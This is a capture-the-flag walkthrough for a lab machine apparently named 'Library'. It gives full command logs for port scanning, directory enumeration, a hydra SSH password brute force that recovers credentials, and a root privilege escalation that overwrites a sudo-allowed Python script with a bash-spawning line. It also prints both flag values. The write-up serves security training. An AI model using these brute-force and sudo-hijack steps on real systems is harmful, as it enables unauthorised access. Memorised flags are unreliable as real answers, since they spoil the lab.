# User.txt

**6d488cbb3f111d135722c33cb635f4ec**

- Start `rustscan` and check all the open ports.

```shell
❯ rustscan -a 10.10.158.170 --ulimit 5000 -- -sC -sV  | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.158.170:22
Open 10.10.158.170:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-31 19:50 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
Initiating Ping Scan at 19:50
Scanning 10.10.158.170 [2 ports]
Completed Ping Scan at 19:50, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:50
Completed Parallel DNS resolution of 1 host. at 19:50, 11.01s elapsed
DNS resolution of 1 IPs took 11.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 5, CN: 0]
Initiating Connect Scan at 19:50
Scanning 10.10.158.170 [2 ports]
Discovered open port 80/tcp on 10.10.158.170
Discovered open port 22/tcp on 10.10.158.170
Completed Connect Scan at 19:50, 0.15s elapsed (2 total ports)
Initiating Service scan at 19:50
Scanning 2 services on 10.10.158.170
Completed Service scan at 19:50, 6.32s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.158.170.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:50
Completed NSE at 19:51, 5.96s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:51
Completed NSE at 19:51, 0.62s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:51
Completed NSE at 19:51, 0.00s elapsed
Nmap scan report for 10.10.158.170
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-03-31 19:50:48 IST for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/X/Zd2/Rc7PrxR+K9bGX9i7Imk3JlU274UsMqM6X03THehc6XUvg0URMryl9IldYLjQvD0fadIg1jB8rCxqzRiJi35nw7ICUXnpZryDS/guLb94Sb9IrLWBTNNdUWV7bTb4gMaGHdyQAmKY62FgL2aKUFMn8SpxJu0WiVIQgcKkv15s17rNqVD39kG8x/bfdftcjn/YtEP09Sy4z1FqXF9FT1xWKaVr3Pd5rCAU4rpOzVpS+qTj77NWaXNDlcg3aCRaILD+4lquq8kVAA+VcXR9IwXOTKJRzRCMfYwd3M6QC45LlRa17xvhI++vBtCcGwxuD9JZsXu0Cd/5fdisrl
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI8Oi4FyiWylek0a1n1TD1/TBOi2uXVPfqoSo1C56D1rJlv4g2g6SDJjW29bhodoVO6W8VdWNQGiyJ5QW2XirHI=
|   256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOPQQrT4KT/PF+8i33LGgs0c83MQL1m863niSGsBDfCN
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:51
Completed NSE at 19:51, 0.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:51
Completed NSE at 19:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:51
Completed NSE at 19:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.34 seconds
```

- Found SSH and HTTP port open.
- Scanned HTTP port with `gobuster`

```shell
❯ gobuster dir --url http://10.10.158.170 -w /usr/share/wordlists/dirb/common.txt  -x php,js,txt,html  | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.158.170
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,js,txt
[+] Timeout:                 10s
===============================================================
2023/03/31 19:54:50 Starting gobuster in directory enumeration mode
===============================================================
/.hta.js              (Status: 403) [Size: 295]
/.hta.txt             (Status: 403) [Size: 296]
/.hta.html            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/.hta.php             (Status: 403) [Size: 296]
/.htaccess.php        (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess.js         (Status: 403) [Size: 300]
/.htpasswd.php        (Status: 403) [Size: 301]
/.htaccess.txt        (Status: 403) [Size: 301]
/.htpasswd.js         (Status: 403) [Size: 300]
/.htaccess.html       (Status: 403) [Size: 302]
/.htpasswd.txt        (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd.html       (Status: 403) [Size: 302]
Progress: 3740 / 23075 (16.21%)               [ERROR] 2023/03/31 19:56:11 [!] Get "http://10.10.158.170/bbclone.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/images               (Status: 301) [Size: 315] [--> http://10.10.158.170/images/]
/index.html           (Status: 200) [Size: 5439]                                  
/index.html           (Status: 200) [Size: 5439]                                  
Progress: 10195 / 23075 (44.18%)                                                 [ERROR] 2023/03/31 19:58:18 [!] Get "http://10.10.158.170/humor": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14120 / 23075 (61.19%)                                                 [ERROR] 2023/03/31 19:59:35 [!] Get "http://10.10.158.170/ofbiz.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14850 / 23075 (64.36%)                                                 [ERROR] 2023/03/31 19:59:50 [!] Get "http://10.10.158.170/paypal.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 15640 / 23075 (67.78%)                                                 [ERROR] 2023/03/31 20:00:07 [!] Get "http://10.10.158.170/pop.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/robots.txt           (Status: 200) [Size: 33]                                    
/robots.txt           (Status: 200) [Size: 33]                                    
/server-status        (Status: 403) [Size: 301]                                   
                                                                                  
===============================================================
2023/03/31 20:02:01 Finished
===============================================================
```


- Checked `/robots.txt` and found one disallowed `User-Agent`

```shell
❯ curl http://10.10.158.170/robots.txt
User-agent: rockyou 
Disallow: /%                                                                                
```

- This may indicate that we need to use brute-force somewhere with `rockyou.txt` .
- Lets try it on `SSH` with username we found on home-page `meliodas`.

```shell
❯ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -f 10.10.158.170 ssh  -I -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-31 20:02:20
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.158.170:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[STATUS] 29.67 tries/min, 89 tries in 00:03h, 14344310 to do in 8058:37h, 4 active
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 14344195 to do in 8203:23h, 4 active
[22][ssh] host: 10.10.158.170   login: meliodas   password: iloveyou1
[STATUS] attack finished for 10.10.158.170 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-31 20:10:39
```

- Got `meliodas:iloveyou1` as credentials. 
- Log in to ssh with this set of credentials.
- Got user flag.

```shell
❯ ssh meliodas@10.10.158.170
The authenticity of host '10.10.158.170 (10.10.158.170)' can't be established.
ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.158.170' (ED25519) to the list of known hosts.
meliodas@10.10.158.170's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ cat user.txt 
6d488cbb3f111d135722c33cb635f4ec
```

# root.txt

**e8c8c6c256c35515d1d344ee0488c617**

- Found `bak.py` in which we have read and write permissions.

```shell
meliodas@ubuntu:~$ ls -la
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
```

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

- We can run `/usr/bin/python /home/meliodas/bak.py` as root without password.

```shell
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

- Remove the old `bak.py` and write new file with malicious code

```shell
meliodas@ubuntu:~$ rm bak.py 
rm: remove write-protected regular file 'bak.py'? y
meliodas@ubuntu:~$ ls
user.txt
meliodas@ubuntu:~$ echo "import os; os.system(\"/bin/bash -p\");" > /home/meliodas/bak.py
meliodas@ubuntu:~$ ls
bak.py  user.txt
```

- Now run the file as root

```shell
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py 
root@ubuntu:~# cat /root/root.txt 
e8c8c6c256c35515d1d344ee0488c617
```




